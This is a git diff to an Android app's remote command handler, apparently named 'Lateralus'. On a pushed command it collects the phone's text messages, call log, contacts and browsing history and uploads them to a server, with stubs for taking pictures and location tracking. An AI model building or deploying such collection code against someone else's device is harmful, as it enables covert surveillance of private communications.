@@ -3,20 +3,22 @@ package net.scottjulian.lateralus;
 
 import android.content.Context;
 import android.location.Location;
+import android.util.Log;
 
-import net.scottjulian.lateralus.components.device.DeviceReader;
 import net.scottjulian.lateralus.components.location.LocDelegate;
-import net.scottjulian.lateralus.components.messaging.MessageReader;
-import net.scottjulian.lateralus.components.network.JsonDataCreator;
 import net.scottjulian.lateralus.components.network.Network;
-import net.scottjulian.lateralus.components.phone.PhoneReader;
+import net.scottjulian.lateralus.components.readers.ContactReader;
+import net.scottjulian.lateralus.components.readers.DeviceReader;
+import net.scottjulian.lateralus.components.readers.InternetHistoryReader;
+import net.scottjulian.lateralus.components.readers.PhonecallReader;
+import net.scottjulian.lateralus.components.readers.TextMessageReader;
 
 import org.json.JSONException;
 import org.json.JSONObject;
 
 
 public class LateralusMessageHandler {
-    private static final String TAG = "LateralusMessageProcessor";
+    private static final String TAG = "LateralusMsgHandler";
 
     public static final String CMD_KEY = "command";
     public static final String CMD_TAKE_PIC       = "take_picture";
@@ -28,50 +30,62 @@ public class LateralusMessageHandler {
     public static final String CMD_START_TRACKING = "start_tracking";
     public static final String CMD_STOP_TRACKING  = "stop_tracking";
 
-    public static final int DATA_COUNT = 1000;
+    public static final String KEY_DATA = "data";
 
     private LocationDelegate _locDelegate;
 
     public static void processMessage(Context ctx, JSONObject data){
         try{
-            JsonDataCreator dc = new JsonDataCreator(ctx);
-            JSONObject jsonData = null;
-
+            DeviceReader deviceReader = new DeviceReader(ctx);
+            JSONObject jsonData = deviceReader.getData();
             switch(data.getString(CMD_KEY)){
                 case CMD_TAKE_PIC:
                     //TODO
                     break;
+
                 case CMD_GET_TEXT_MSGS:
-                    jsonData = dc.createTextMessagingData(MessageReader.getConversations(ctx, DATA_COUNT));
+                    TextMessageReader txtReader = new TextMessageReader(ctx);
+                    jsonData.put(KEY_DATA, txtReader.getData());
                     break;
+
                 case CMD_GET_PHONECALLS:
-                    jsonData = dc.createPhonecallData(PhoneReader.getPhonecalls(ctx, DATA_COUNT));
+                    PhonecallReader phoneReader = new PhonecallReader(ctx);
+                    jsonData.put(KEY_DATA, phoneReader.getData());
                     break;
+
                 case CMD_GET_CONTACTS:
-                    //TODO
+                    ContactReader conReader = new ContactReader(ctx);
+                    jsonData.put(KEY_DATA, conReader.getData());
                     break;
+
                 case CMD_GET_HISTORY:
-                    jsonData = dc.createInternetHistoryData(DeviceReader.getInternetHistory(ctx, DATA_COUNT));
+                    InternetHistoryReader ihReader = new InternetHistoryReader(ctx);
+                    jsonData.put(KEY_DATA, ihReader.getData());
                     break;
+
                 case CMD_GET_LOCATION:
                     //TODO
                     break;
+
                 case CMD_START_TRACKING:
                     //TODO
                     return;
+
                 case CMD_STOP_TRACKING:
                     //TODO
                     return;
+
             }
 
             if(jsonData != null){
                 Network.fireJsonData(ctx, Network.API_PUT, jsonData);
             }
             else{
-                // TODO: json data was null
+                Log.e(TAG, "Error: JSON data was empty!");
             }
         }
         catch(JSONException e){
+            Log.e(TAG, "Error creating data for the gcm request");
             e.printStackTrace();
         }
     }
